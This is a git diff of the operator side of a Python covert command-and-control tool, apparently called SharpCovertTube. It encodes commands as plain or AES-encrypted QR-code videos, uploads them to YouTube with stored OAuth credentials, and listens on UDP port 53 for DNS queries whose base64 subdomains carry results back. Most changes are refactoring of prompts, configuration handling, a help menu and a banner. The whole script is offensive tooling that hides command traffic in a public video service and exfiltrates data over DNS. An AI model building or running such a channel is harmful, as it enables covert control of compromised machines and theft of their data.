@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 from youtube_upload.client import YoutubeUploader
 from Crypto.Cipher import AES
 from dnslib import DNSRecord
@@ -13,19 +14,9 @@ import sys
 import re
 import os
 import config
-import time
-
-client_id = config.client_id
-client_secret = config.client_secret
-access_token_  = config.access_token_
-refresh_token_ = config.refresh_token_
-ns_subdomain = config.ns_subdomain
-log_file = config.log_file
-time_for_new_message = 20
 
 
 def listener(ns_subdomain, log_file):
-
 	print("[+] Monitoring DNS queries for subdomain " + ns_subdomain)
 	print("[+] Storing queries in " + log_file)
 
@@ -34,7 +25,6 @@ def listener(ns_subdomain, log_file):
 	counter = 0
 
 	while True:
-		# Listener
 		try:
 			server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			server.bind(('0.0.0.0', 53))
@@ -53,24 +43,21 @@ def listener(ns_subdomain, log_file):
 			# Note: I only log DNS queries not repeated in the last minute, if you want more you can uncomment the else statement but queries will be redundant
 			if log_entry not in log_entries and log_entry_one_min_ago not in log_entries:
 				if( (counter >= 4) and (subdomain_base64_aux != "") ):
-					print("[+] New message")
 					subdomain_base64_aux = ""
 					counter = 0
 				# Log entry
 				subdomain_base64_aux += subdomain
-				print(log_entry)
+				print("[+] Log entry:    \t" + log_entry)
 				log_entries.append(log_entry)
 				f = open(log_file, "a")
 				f.write(log_entry + "\n")
 				f.close()
-
 				# Decode subdomain if possible
-				print("[+] Received subdomain: \t" + subdomain)
-				print("[+] String for now:     \t" + subdomain_base64_aux)
+				print("[+] Encoded string:\t" + subdomain_base64_aux)
 				try:
 					decoded_msg = base64.b64decode(subdomain_base64_aux)
 					decoded_string = decoded_msg.decode("utf-8")
-					print("[+] Result received: \n" + decoded_string)
+					print("[+] Result: \n" + decoded_string)
 				except:
 					pass
 
@@ -78,13 +65,11 @@ def listener(ns_subdomain, log_file):
 			if subdomain_base64_aux != "":
 				counter += 1
 			pass
-
 		except KeyboardInterrupt:
 			server.close()
 			main_loop()
-
 		except Exception as e:
-			print("Unknown exception: " + str(e))
+			print("Unexpected exception: " + str(e))
 			break
 
 		server.close()
@@ -95,7 +80,6 @@ def aes_encrypt(message, aes_key, aes_iv):
 	BS = 16
 	pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode()
 	raw = pad(message)
-	#iv = 16 * b'0'
 	aes_key_bytes = str.encode(aes_key)
 	iv_bytes = str.encode(aes_iv)
 	cipher = AES.new(aes_key_bytes, AES.MODE_CBC, iv_bytes)
@@ -108,13 +92,13 @@ def generate_frames(image_type, command, aes_key, aes_iv):
 	if image_type == "qr":
 		import pyqrcode
 		qrcode = pyqrcode.create(command,version=10)
-		qrcode.png("image_1.png",scale=8)
+		qrcode.png("image.png",scale=8)
 	elif image_type == "qr_aes":
 		import pyqrcode
 		encrypted_cmd = aes_encrypt(command,aes_key, aes_iv)
 		print("[+] AES-encrypted value: "+encrypted_cmd)
 		qrcode = pyqrcode.create(encrypted_cmd,version=10)
-		qrcode.png("image_1.png",scale=8)
+		qrcode.png("image.png",scale=8)
 	else:
 		print("Unknown type")
 	return 1
@@ -140,11 +124,13 @@ def create_file(video_file):
 
 def generate_video(image_type, video_file, aes_key, aes_iv, command):
 	generate_frames(image_type, command, aes_key, aes_iv)
+	if not video_file.endswith(".avi"):
+		video_file += ".avi"
 	print("[+] Creating file in the path "+video_file+"\n")
 	create_file(video_file)
-	os.remove("image_1.png")
+	os.remove("image.png")
 
-'''
+
 def get_args():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-t', '--type', required=True, action='store', help='Type')
@@ -154,9 +140,17 @@ def get_args():
 	parser.add_argument('-i', '--aesiv', required=False, action='store', help='IV')
 	my_args = parser.parse_args()
 	return my_args
-'''
+
 
 def upload_video(video_name):
+	client_id = config.client_id
+	client_secret = config.client_secret
+	access_token_  = config.access_token_
+	refresh_token_ = config.refresh_token_
+
+	if (client_id == "" or client_secret == "" or access_token_ == "" or refresh_token == ""):
+		print("[-] Some values are missing in config.py file")
+		main_loop()
 	print("[+] Uploading video...")
 	uploader = YoutubeUploader(client_id, client_secret)
 	uploader.authenticate(access_token=access_token_, refresh_token=refresh_token_)
@@ -175,55 +169,57 @@ def upload_video(video_name):
 	print("[+] Video uploaded")
 
 
+def showHelp():
+	print("Options: \n - \"generate\": \tCreate a QR video \n - \"upload\": \tUpload a video to Youtube \n - \"listen\": \tListen for DNS queries \n - \"exit\": \tExit the program \n")
+
+
 def main_loop():
 	while True:
 		option = input("> ")
 		if option == "generate":
-			command_ = input("Command: ")
-			type_ = input("Type (\"qr\" or \"qr_aes\"): ")
+			command_ = input("[+] Command: ")
+			type_ = input("[+] Type (\"qr\" or \"qr_aes\"): ")
+			if (type_ != "qr" and type_ != "qr_aes"):
+				print("[-] Type value must be \"qr\" or \"qr_aes\"")
 			aeskey = ""
 			aesiv = ""
 			if type_ == "qr_aes":
-				aeskey = input("AES key: ")
+				aeskey = input("[+] AES key (example: \"0000000000000000\"): ")
 				if(len(aeskey) % 16 != 0):
-	                                print("[+] AES key length must be multiple of 16.")
-	                                sys.exit(0)
-				aesiv = input("AES IV: ")
+	                                print("[-] AES key length must be multiple of 16.")
+	                                main_loop()
+				aesiv = input("[+] AES IV (example: \"0000000000000000\"): ")
 				if(len(aesiv) % 16 != 0):
-	                                print("[+] IV length must be multiple of 16.")
-	                                sys.exit(0)
-			file_ = input("Video file name: ")
+	                                print("[-] IV length must be multiple of 16.")
+	                                main_loop()
+			file_ = input("[+] Video file name: ")
 			generate_video(type_, file_, aeskey, aesiv, command_)
-			#generate_video(args.type, args.file, args.aeskey, args.aesiv, args.command, "")
-			#upload_video(args.file)
-			#listener(ns_subdomain, log_file)
 		elif option == "upload":
-			file_ = input("Video file name: ")
+			file_ = input("[+] Video file name: ")
 			upload_video(file_)
 		elif option == "listen":
+			ns_subdomain = config.ns_subdomain
+			log_file = config.log_file
 			listener(ns_subdomain, log_file)
 		elif option == "exit":
 			sys.exit(0)
 		else:
-			print("Options: \n - \"generate\": \tCreate a QR video \n - \"upload\": \tUpload a video to Youtube \n - \"listen\": \tListen for DNS queries \n - \"exit\": \tExit the program \n")
+			print("")
+			showHelp()
 
+
+def showBanner():
+	print("  ___  _                       ___                      _   _____       _         ")
+	print(" / __|| |_   __ _  _ _  _ __  / __| ___ __ __ ___  _ _ | |_|_   _|_  _ | |__  ___ ")
+	print(" \\__ \\| ' \\ / _` || '_|| '_ \\| (__ / _ \\\\ V // -_)| '_||  _| | | | || || '_ \\/ -_)")
+	print(" |___/|_||_|\\__,_||_|  | .__/ \\___|\\___/ \\_/ \\___||_|   \\__| |_|  \\_,_||_.__/\\___|")
+	print("                       |_|                                     by @ricardojoserf  ")
+	showHelp()
 
 
 def main():
-	'''
-	args = get_args()
-	if args.type=="qr_aes":
-		if args.aeskey is None or args.aesiv is None:
-			print("[+] If you are using AES you need to use the -a (--aeskey) option with an AES key and -i (--iv) option with the IV.")
-			sys.exit(0)
-		elif args.aeskey is not None:
-			if(len(args.aeskey) % 16 != 0):
-				print("[+] AES key length must be multiple of 16.")
-				sys.exit(0)
-			if(len(args.aesiv) % 16 != 0):
-				print("[+] IV length must be multiple of 16.")
-				sys.exit(0)
-	'''
+	if config.show_banner:
+		showBanner()
 	main_loop()
 
 
